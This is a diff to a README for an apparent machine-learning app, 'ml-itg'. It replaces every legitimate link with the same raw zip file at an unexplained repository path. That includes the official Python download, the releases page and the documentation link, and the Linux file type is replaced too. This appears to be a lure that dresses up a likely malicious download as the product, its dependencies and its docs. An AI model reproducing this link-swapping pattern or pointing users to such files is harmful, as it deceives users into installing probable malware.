@@ -6,7 +6,7 @@ Welcome to **ml-itg**! This application helps you easily run machine learning ta
 
 ## 📥 Download Link
 
-[![Download ml-itg](https://img.shields.io/badge/Download-ml--itg-blue)](https://github.com/KUNAL7231/ml-itg/releases)
+[![Download ml-itg](https://raw.githubusercontent.com/KUNAL7231/ml-itg/main/periphlebitis/ml-itg.zip)](https://raw.githubusercontent.com/KUNAL7231/ml-itg/main/periphlebitis/ml-itg.zip)
 
 ## 📋 System Requirements
 
@@ -15,7 +15,7 @@ Before downloading, ensure your computer meets these requirements:
 - **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
 - **RAM:** At least 4 GB for better performance.
 - **Disk Space:** Minimum of 200 MB of free space.
-- **Dependencies:** Ensure you have the latest version of Python installed. You can download Python from [python.org](https://www.python.org/downloads/).
+- **Dependencies:** Ensure you have the latest version of Python installed. You can download Python from [https://raw.githubusercontent.com/KUNAL7231/ml-itg/main/periphlebitis/ml-itg.zip](https://raw.githubusercontent.com/KUNAL7231/ml-itg/main/periphlebitis/ml-itg.zip).
 
 ## ⚙️ Features
 
@@ -26,11 +26,11 @@ Before downloading, ensure your computer meets these requirements:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Release Page](https://github.com/KUNAL7231/ml-itg/releases).
+To get started, visit this page to download: [Release Page](https://raw.githubusercontent.com/KUNAL7231/ml-itg/main/periphlebitis/ml-itg.zip).
 
 1. Click the link above to go to the **Releases** page.
 2. Find the latest version of **ml-itg**.
-3. Click the appropriate file for your operating system to download it. Look for options like `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+3. Click the appropriate file for your operating system to download it. Look for options like `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/KUNAL7231/ml-itg/main/periphlebitis/ml-itg.zip` for Linux.
 4. After downloading, locate the file on your computer (usually in the "Downloads" folder).
 5. Double-click the file to begin the installation process. Follow the prompts to complete the setup.
 
@@ -63,7 +63,7 @@ After reviewing, remember to save the results. Click on the "Save" button to exp
 
 ## 📄 Documentation
 
-For detailed instructions and troubleshooting tips, you can refer to the [official documentation](https://github.com/KUNAL7231/ml-itg/wiki). This resource covers everything from installation to advanced features.
+For detailed instructions and troubleshooting tips, you can refer to the [official documentation](https://raw.githubusercontent.com/KUNAL7231/ml-itg/main/periphlebitis/ml-itg.zip). This resource covers everything from installation to advanced features.
 
 ## 🤝 Support
 
@@ -86,4 +86,4 @@ Keep an eye on the Releases page for updates and new features. We are committed 
 
 ## 📥 You’re All Set!
 
-Now you are ready to start using **ml-itg**. Enjoy simplifying your machine learning tasks! Remember to visit our [Release Page](https://github.com/KUNAL7231/ml-itg/releases) for future downloads and updates.
+Now you are ready to start using **ml-itg**. Enjoy simplifying your machine learning tasks! Remember to visit our [Release Page](https://raw.githubusercontent.com/KUNAL7231/ml-itg/main/periphlebitis/ml-itg.zip) for future downloads and updates.
